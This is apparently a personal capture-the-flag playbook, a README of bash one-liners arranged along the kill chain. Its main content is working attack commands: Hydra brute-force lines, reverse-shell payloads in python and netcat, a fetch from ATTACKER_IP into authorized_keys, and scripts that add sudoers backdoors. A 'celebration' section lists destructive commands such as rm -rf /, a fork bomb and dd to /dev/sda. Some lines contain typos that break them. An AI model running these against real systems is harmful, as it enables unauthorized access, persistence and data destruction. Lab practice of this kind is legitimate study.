![](/images/ctf-playbook.png)

# CTF Playbook Instructions
CTF playbook is my personal playbook for enumeration and attack techniques. The techniques here are meant to be loud and clumsy. No fancy obfuscation here, just smash and grab the flag. Most techniques here are bash one-liners. Ultimately, they will be looped into larger bash scripts.

The playbook will loosely follow Lockheed Martin's [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html). It is currently linux/unix focused, with plans to expand in the future.

Start enumerating your target with plays in the playbook. Plays are grouped into categories called playsets. When you've successfully completed a playset, you can select the arrow image to be taken to the next link in the kill chain. This process often has iterations in a loop. Use the previous play icon to return to a playset when you've upgraded access credentials or visibility.

Next Play Icon:

![Alt text](/images/ctf-playbook-icon.png "Play Icon")

Previous Play Icon: 

![Alt text](/images/ctf-back-button.png "Previous Play")


# Index and Playsets
- [CTF Playbook Instructions](#ctf-playbook-instructions)
- [Index and Playsets](#index-and-playsets)
- [Reconnaissance 1](#reconnaissance-1)
- [Reconnaissance 2](#reconnaissance-2)
- [Reconnaissance 3](#reconnaissance-3)
- [Weaponization](#weaponization)
- [Delivery](#delivery)
- [Exploitation](#exploitation)
- [Reconnaissance 4](#reconnaissance-4)
- [Command and GitTroll (CG2)](#command-and-gittroll-cg2)
- [Priviledge Escalation](#priviledge-escalation)
- [Actions on Objectives](#actions-on-objectives)
- [Celebration](#celebration)
- [Documentation](#documentation)
- [Credit and Resources](#credit-and-resources)


# Reconnaissance 1 
Locate and identify the target 
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-2)  

__Scan Network For Targets__
``` bash
arp-scan -I [interface] -l
nmap -sn -oG sweep.txt -p [CIDR range of network] | grep "Status Up"
netdiscover -i [interface] -p
nmap -sP [target/CIDR Range]
```
# Reconnaissance 2  
Gather information on the network
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-3)  

__Simple Port Scanning Enumeration__
``` bash 

nmap -T 5 [target]
nmap -p 1-65535 -sV -sS -T4 [target]
nmap -sV -sT -O -A -p- [target]
nmap -sU -p- [target]
nmap -Pn -p- [target]
nmap -sT -p 161 [target/254] -oG snmp_results.txt 
(then grep)

nmap -sU --script nbstat.nse -p 137 [target]

*sparta, add [target] to scope*

nc -nv [target][port]
nc -nlvp [target][port]
ncat [host] [port]
```
__Vulnerability Scanning__
``` bash
nmap -sc [target]
nmap --script discovery
nmap --script exploit
nmap --script "[port]-*" [target]
nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 [target]
nmap -p80,443 [Target or CIDR] -oG - | nikto.pl -h -

msfconsole
openvas 

enum4linux -a [target]

ike-scan [target]
```

# Reconnaissance 3 
Dig deeper into particular services
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#weaponization) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)


__Web Server Enumeration__
``` bash
firefox [target]
firefox [target].robots
dirb http://[target]
nikto -h [target]
```

__NBT SMB Scan__
```bash
nbtscan -l [target]

smbclient -L //[target]
```

# Weaponization 
Turn recon into actionable exploits
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#delivery)

__Brute Force Services__
```bash
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
[target] [service] -V
#Hydra brute force against SNMP
hydra -P password-file.txt -v $ip snmp
#Hydra FTP known user and password list
hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp
#Hydra SSH using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
#Hydra SSH using a known password and a username list
hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh
#Hydra SSH Against Known username on port 22
hydra $ip -s 22 ssh -l <user> -P big\_wordlist.txt
#Hydra POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
#Hydra SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
#Hydra attack http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
#Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
#Hydra brute force a Wordpress admin login
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

__Malicous File Upload__
```bash

```

* test common services pop3,ftp,ssh, smtp

```

+  __Metasploit__:
    +    __Select Exploit__: $ use [exploit]
    +    __See Options__: $ show options
    +    __Set Options__: $ set [option name] [option value]
    +    __Run Exploit__: $ run
    +    __Check for session__: $ session -ls
```

# Delivery 
Deliver payload to the target
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)

__Upload Maliscous File__
```bash
# Use the following techniques to upload malfiles such as php reverse shells

# Upload via HTTP
# Upload via FTP
# Upload via TFTP
# Upload via SMB
```

# Exploitation 
Successful gain unauthorized access
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-4)

# Reconnaissance 4
Gather additional information previously unattainable. Some of these will overlap with renumeration rechniques described in the [Priv Escalation Playset](#priviledge-escalation)
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#command-and-gittroll-(cg2)) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)


``` bash
$ history 
$ netstat -ano
$ strings [filename.extension]
$ file [filename.extension]
$ ps aux
$ who
$ uname -a 
$ printenv
$ netstat -natup
$ ps aux | grep root
$ sudo -l
$ sudo su -l
$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;
$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
$ mount; df -h; cat /etc/fstab

# Find other Users
 $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l

# World Readable / Writable Files 
$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;

# Inspect web traffice
$ tcpdump tcp port 80 -w output.pcap -i eth0


# look at cronjobs that runs as root with incorrect permissions
```

# Command and GitTroll (CG2) 
Establish a lasting backdoor 
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#priviledge-escalation)  

If you really wanted to test this ability. You can use [Merlin](https://github.com/Ne0nd0g/merlin). This is out of scope for boot to root CTF competitions, but has some potential functionality in larger format events.

# Priviledge Escalation 
Escalate to root  . [See Credit](#credit-and-resources)
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#actions-on-objectives)  

__Manual Testing__
```bash
sudo su -
sudo -l
ps aux | grep root

#Add user www-data to sudoers with no password
$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

__Automate Scripts__

```bash
wget https://github.com/pentestmonkey/unix-privesc-check
```

__If You have a Reverse Shell...__
```bash
#Get a TTY shell after a reverse shell connection
$ python -c 'import pty;pty.spawn("/bin/bash")'
#Set PATH TERM and SHELL if missing:
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ export TERM=xterm
$ export SHELL=bash
#Add public key to authorized keys:
$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys

#Some payloads to overcome limited shells:
$ ssh user@$ip nc $localip 4444 -e /bin/sh
    enter user's password
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ export TERM=linux

$ python -c 'import pty; pty.spawn("/bin/sh")'

$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

$ echo os.system('/bin/bash')

$ /bin/sh -i

$ exec "/bin/sh";

$ perl —e 'exec "/bin/sh";'

#From within tcpdump
$ echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root

```
__Exploiting Services__
```bash
#MySQL
sys_exec('usermod -a -G admin username')

```
__Metasploit__
``` bash
meterpreter: $ getsystem
```
__Python Scripts__
```python
# Add sudoers
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```
# Actions on Objectives 
Gather necessary CTF documentation (flags)
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#celebration)  

__Search for Flags__
``` bash
find "*flag*"
find "*FLAG*"
find "*FLAG.txt*"
find -03 -L /var/www/ -name "*flag*"

find . -type f -exec grep "*flag*" '{}' \; -print

# If you've found a flag and calculated size
find / -size -[flag size] 

locate "*flag*"
```

# Celebration 
Add your mark
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#documentation)

A quick list of resources for celebrating your CTF root
1.  Overwrite your victory website to CTF web server  

```bash
# Example, fork the template to make your own victory site
git clone https://github.com/tcbutler320/ctf-playbook/tree/master/victory-mark

rm -r /var/www
cp victory-mark /var/www/

```  
2.  Trash the box, !VERY dangerous, you've been warned. Research has not been done to determine if trashing a VM on your local host will effect your local host. [#trashthebox](https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/)
```bash
# Carnage (don't run this on anything you care about, you've been warned)
$ rm -rf /
$ :(){:|:&};:
$ command > /dev/sda
$ mv /home/user/* /dev/null
$ dd if=/dev/random of=/dev/sda 

```


# Documentation
Documentation is important, as you will need to come back frequently to things you've found. 

+  __CherryTree__: $
+  __KeepNote__: $
+  __TextPad__: $

# Credit and Resources
There are countless resources and people who deserve credit for their contributions to this playbook. 

+  Credit and Resources  
    -    [CheatSheet God](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_PenTesting.txt)
    -    [Adam P](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png) : Logo
    -    [Guif: Priv Escalation](https://guif.re/linuxeops): One of the best resources I've found for raw scripts on Priv Esc. Thanks!


[logo]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Next Play" 
